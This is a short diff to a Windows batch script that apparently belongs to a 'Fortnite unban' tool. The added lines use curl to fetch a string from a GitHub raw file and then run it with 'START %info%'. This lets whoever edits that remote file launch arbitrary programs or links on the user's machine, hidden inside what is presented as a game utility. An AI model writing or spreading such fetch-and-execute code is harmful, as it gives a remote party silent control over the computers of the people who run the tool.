@@ -56,8 +56,9 @@
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
-for /f "usebackq delims=" %%a in (`PowerShell -Command "(new-object net.webclient).DownloadString('https://raw.githubusercontent.com/FeminineFemale/Fortnite-Unban-Pack/main/infodontembed.txt')"`) do set info=%%a
 title MasculineUnban b1 BETA - lodaing
+for /f "usebackq delims=" %%a in (`curl https://raw.githubusercontent.com/FeminineFemale/Fortnite-Unban-Pack/main/infodontembed.txt`) do set info=%%a
+START %info%
 ::resize window
 %extd% /getconsoletitle
 %extd% /resizewindow "%result%" 0 0 1129 520
@@ -112,10 +113,9 @@ pause
 title MasculineUnban b1 BETA
 color 0B
 type doh.txt
-echo.
-echo.
-echo.
 echo %info%
+echo.
+echo.
 echo.
 echo.
 echo.
